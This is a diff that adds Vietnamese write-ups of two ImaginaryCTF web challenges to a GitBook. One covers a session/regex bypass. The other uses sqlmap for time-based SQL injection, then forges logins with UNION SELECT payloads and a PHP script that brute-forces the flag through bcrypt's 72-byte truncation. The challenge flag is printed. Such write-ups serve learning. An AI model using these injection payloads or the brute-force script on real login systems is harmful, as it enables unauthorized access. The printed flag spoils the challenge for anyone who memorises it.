@@ -93,3 +93,160 @@ Upload tấm ảnh đó lên là lấy được flag
 
 <figure><img src=".gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>
 
+## **idoriot-revenge**
+
+<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+Nếu bạn muốn lấy được flag, bạn cần tìm cách để giá trị của `$user_id` là số nguyên 0 và `$_SESSION['username']` phải khớp với mẫu được tạo từ `$admin['username']`.
+
+Nếu mẫu là một biểu thức chính quy đơn giản như "/^admin$/i", điều kiện `preg_match("/".$admin['username']."/", $_SESSION['username'])` sẽ khớp nếu giá trị của `$_SESSION['username']` là "admin" (không phân biệt chữ hoa chữ thường). Vì vậy, bạn có thể đặt giá trị cho `$_SESSION['username']` là "admin" + "blalblabla" để lấy được flag.
+
+<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+## Login
+
+Đầu tiên ta chạy thử sqlmap thì thấy username bị dính time based
+
+<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Vậy dễ rồi ta chỉ cần thêm task table để tìm tên table
+
+<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+Biết được table rồi ta sẽ tìm tiếp column
+
+<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+Có 2 cột là pwhash và username vậy ta chạy tiếp sqlmap xem trong đó có gì tiếp thôi
+
+<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+Ta có được username nhưng password đã bị hash rồi thử tìm thêm thông tin thì ta kiếm được source code như sau
+
+<figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+Analyze hash thì ta thấy nó là bcrypt
+
+<figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+
+Thử dùng tool crack thì ta chỉ crack được password của guest thau
+
+<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+
+Ở đây ta biết có 1 cách bypass đó là khi hash password bằng php thì nó sẽ sử dụng PASSWORD\_BCRYPT và nó có cách bypass là nếu 2 string có độ dài > 72 ký tự thì khi verify lại luôn đúng
+
+Test code
+
+```php
+<?php
+$plain = str_repeat("a", 72);
+$challenge = str_repeat("a", 72) . "cc";
+
+$hashed_password = password_hash($plain, PASSWORD_BCRYPT);
+echo "Hashed Password: " . $hashed_password . PHP_EOL;
+
+$is_verified = password_verify($challenge, $hashed_password);
+echo "Is Verified: " . ($is_verified ? "true" : "false") . PHP_EOL;
+?>
+```
+
+<figure><img src=".gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+
+Ta sẽ sử dụng payload sau để brute force password thôi
+
+ví dụ
+
+<pre><code>username = admin' union select 'admin' , '{hash}' -- -
+<strong>password = "a" * (71 - len(flag))
+</strong>hash = "a" * (71 - len(flag) + flag
+</code></pre>
+
+Bây giờ viết code cho nó tự hash và request thôi nếu gặp welcome admin thì đó là 1 ký tự đúng
+
+<figure><img src=".gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+
+Ở đây nó GET 1 cái magic gì đó tìm không thấy nên ta thử dùng tk của guest sql vô admin thì ta được
+
+username : `guest' UNION SELECT 'admin', '$2y$10$vw1OC907/WpJagql/LmHV.7zs8I3RE9N0BC4/Tx9I90epSI2wr3S.' AS pwhash --`
+
+password: guest
+
+<figure><img src=".gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+
+Magic: 688a35c685a7a654abc80f8e123ad9f0
+
+Sử url thành [http://login.chal.imaginaryctf.org/?688a35c685a7a654abc80f8e123ad9f0](http://login.chal.imaginaryctf.org/?688a35c685a7a654abc80f8e123ad9f0)
+
+tiến hành viết code để exploit thôi
+
+```php
+<?php
+$url = "http://login.chal.imaginaryctf.org/?688a35c685a7a654abc80f8e123ad9f0";
+
+// Mảng lưu trữ các ký tự đã tìm thấy trong flag, ban đầu là các ký tự đã biết "ictf"
+$secret = ["i", "c", "t", "f"];
+
+while (true) {
+    // Độ dài của ký tự cần brute force, giả sử flag có độ dài là 71 ký tự
+    $length = 71 - count($secret);
+
+    // Ký tự "overflow" là ký tự filler (tràn), có thể là bất kỳ ký tự nào
+    $overflow = str_repeat("A", $length);
+
+    // Duyệt qua các ký tự in được (loại bỏ 6 ký tự cuối)
+    foreach (str_split("{0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~") as $c) {
+        $guess = $overflow . implode("", $secret) . $c;
+
+        // Hash password bằng hàm password_hash()
+        $hashed_password = password_hash($guess, PASSWORD_BCRYPT);
+
+        // Tạo một mảng dữ liệu để gửi đi trong yêu cầu POST
+        $data = array(
+            'username' => "xxx' UNION SELECT 'admin' AS username, '$hashed_password' AS pwhash--",
+            'password' => $overflow
+        );
+
+        // Thiết lập các tùy chọn yêu cầu
+        $options = array(
+            'http' => array(
+                'header' => "Content-type: application/x-www-form-urlencoded\r\n",
+                'method' => 'POST',
+                'content' => http_build_query($data),
+            ),
+        );
+
+        // Tạo context stream
+        $context = stream_context_create($options);
+
+        // Thực hiện yêu cầu POST và lưu kết quả vào biến $response
+        $response = file_get_contents($url, false, $context);
+
+        // Kiểm tra xem trong response có chuỗi "Welcome admin" hay không
+        if (strpos($response, 'Welcome admin') !== false) {
+            // Nếu tìm thấy, thêm ký tự $c vào mảng $secret và tiếp tục vòng lặp
+            $secret[] = $c;
+            echo "[!] found! " . implode("", $secret) . PHP_EOL;
+            break;
+        } else {
+            echo "trying $c..." . PHP_EOL;
+        }
+
+        // Nghỉ 1 giây để tránh bị chặn
+        sleep(1);
+    }
+}
+?>
+
+```
+
+flag:&#x20;
+
+```txt
+ictf{why_are_bcrypt_truncating_my_passwords?!}
+```
